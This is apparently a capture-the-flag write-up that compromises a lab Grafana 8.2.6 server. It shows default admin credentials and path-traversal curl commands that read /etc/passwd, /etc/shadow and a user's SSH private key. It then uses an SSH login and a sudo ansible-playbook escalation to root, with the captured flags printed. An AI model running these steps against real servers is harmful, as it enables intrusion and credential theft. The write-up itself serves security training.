Ressources: https://exploit-notes.hdks.org/exploit/web/grafana-pentesting/
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/grafana
## Recon
```
└─# nmap -sS -vvv -A --min-rate 5000 $ip

PORT   STATE SERVICE
22/tcp open  ssh
3000/tcp open unknown

```
I found an open port : `http://10.0.160.148:3000/login` and it's a grafana instances.
**1st Methods**
i will look for default creds. and found `admin/admin`
**second method**
and in the footer i found:
```
 Documentation
Support
Community Enterprise (Free & unlicensed) v8.2.6 (c3cc4da7a)
```
I Can search exploit for this version.
On google i found a lot of CVEs. i will try them

So now i am connected on the admin panel, i will look for something like upload shell or a console to run command.
## Foothold.
I will try to find the LFI
```
└─# curl --path-as-is http://10.0.160.148:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
grafana:x:102:102::/usr/share/grafana:/bin/false
ETSCTF:x:1000:102:ETSCTF User:/home/ETSCTF:/bin/bash
```
Good, now i will try to read the  ETSCTF id_rsa
```
└─# curl --path-as-is http://10.0.160.148:3000/public/plugins/alertlist/../../../../../../../../etc/shadow 
root:*:19639:0:99999:7:::
daemon:*:19639:0:99999:7:::
bin:*:19639:0:99999:7:::
sys:*:19639:0:99999:7:::
sync:*:19639:0:99999:7:::
games:*:19639:0:99999:7:::
man:*:19639:0:99999:7:::
lp:*:19639:0:99999:7:::
mail:*:19639:0:99999:7:::
news:*:19639:0:99999:7:::
uucp:*:19639:0:99999:7:::
proxy:*:19639:0:99999:7:::
www-data:*:19639:0:99999:7:::
backup:*:19639:0:99999:7:::
list:*:19639:0:99999:7:::
irc:*:19639:0:99999:7:::
gnats:*:19639:0:99999:7:::
nobody:*:19639:0:99999:7:::
_apt:*:19639:0:99999:7:::
sshd:*:19659:0:99999:7:::
grafana:*:19659:0:99999:7:::
ETSCTF:*LK*:19659:0:99999:7:::
```
```
└─# curl --path-as-is http://10.0.160.148:3000/public/plugins/alertlist/../../../../../../../../home/ETSCTF/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAl0L5Ywi+spzRIUbUUbyPabiNLMZNbc2I4T7RiRkqr10jTexntWTo
```
```
└─# ssh ETSCTF@10.0.160.148 -i id_rsa
Linux grafana.bctf.africa 4.19.0-23-amd64 #1 SMP Debian 4.19.269-1 (2022-12-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
ETSCTF@grafana:~$ 
ETSCTF_a742aa6df6fd9336b10f85de6eea7a9b
```

## Privilege Escalation
```
ETSCTF@grafana:~$ sudo -l
Matching Defaults entries for ETSCTF on grafana:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ETSCTF may run the following commands on grafana:
    (ALL : ALL) NOPASSWD: /usr/bin/ansible-playbook
ETSCTF@grafana:~$ 
```
https://gtfobins.github.io/gtfobins/ansible-playbook/
```
ETSCTF@grafana:~$ sudo /usr/bin/ansible-playbook $TF
[WARNING]: No inventory was parsed, only implicit localhost is available
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] ********************************************************************************************************************

TASK [Gathering Facts] **************************************************************************************************************
ok: [localhost]

TASK [shell] ************************************************************************************************************************
# id
uid=0(root) gid=0(root) groups=0(root)
```
Rooted
`ETSCTF_e35571c630ac64f1eb446ad9d2ac00f9`